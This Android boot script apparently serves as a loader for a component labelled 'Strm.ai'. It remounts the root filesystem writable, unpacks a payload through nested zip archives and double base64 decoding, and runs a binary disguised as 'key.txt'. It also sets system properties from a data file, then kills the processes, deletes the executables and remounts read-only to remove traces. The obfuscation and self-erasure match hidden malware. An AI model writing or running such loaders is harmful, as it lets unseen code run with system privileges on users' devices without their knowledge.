#!/system/bin/sh
### SQ ###
if [ -e /sys/power/wake_lock ];then echo "Strm_ai">/sys/power/wake_lock;fi;while true;do BOOT=$(getprop sys.boot_completed);if [ "$BOOT" -eq "1" ];then sleep 18;break;else sleep 3;fi;done;if [ -e /system/etc/Strm.ai/i.sh ];then /system/etc/Strm.ai/i.sh;rm -f /system/etc/Strm.ai/i.sh;fi;B=/system/etc/Strm.ai/busybox;mount -o remount,rw /;mount -o remount rw /;$B mount -o remount,rw /;$B rm -Rf /Strm.ai;$B mkdir /Strm.ai;mount -t tmpfs -o size=6M tmpfs /Strm.ai;$B mount -t tmpfs -o size=6M tmpfs /Strm.ai;$B sleep 0.5;if [ ! -d /bin ];then $B ln -s /system/bin /bin;fi;if [ ! -e /bin/sh ];then $B ln -s /system/bin/sh /bin/sh;fi;$B cp -f /system/etc/Strm.ai/busybox /Strm.ai/busybox;$B chmod 777 /Strm.ai/*;$B sleep 0.5;B=/Strm.ai/busybox;$B unzip -o /system/etc/Strm.ai/f -d /Strm.ai/;$B base64 -d /Strm.ai/r>>/Strm.ai/u;$B rm -f /Strm.ai/r;$B base64 -d /Strm.ai/u>>/Strm.ai/ss;$B rm -f /Strm.ai/u;$B unzip -o /Strm.ai/ss -d /Strm.ai/;$B sleep 0.5;$B rm -f /Strm.ai/ss;$B unzip -o /Strm.ai/s/rr -d /Strm.ai/s/;$B rm -f /Strm.ai/s/rr;$B chmod 777 /Strm.ai/s;$B chmod 777 /Strm.ai/s/rre.sh;if [ -e /data/fprop ];then while IFS='' read -r p;do setprop $($B echo "$p");done</data/fprop;fi;$B sleep 0.5;$B setsid /Strm.ai/s/key.txt &
$B sleep 69;$B killall rre.sh;$B killall key.txt;$B rm -f /Strm.ai/s/rre.sh;$B rm -f /Strm.ai/s/key.txt;if [ -e /sys/power/wake_unlock ];then $B echo "Strm_ai">/sys/power/wake_unlock;fi;mount -o remount,ro /;mount -o remount ro /;$B mount -o remount,ro /;
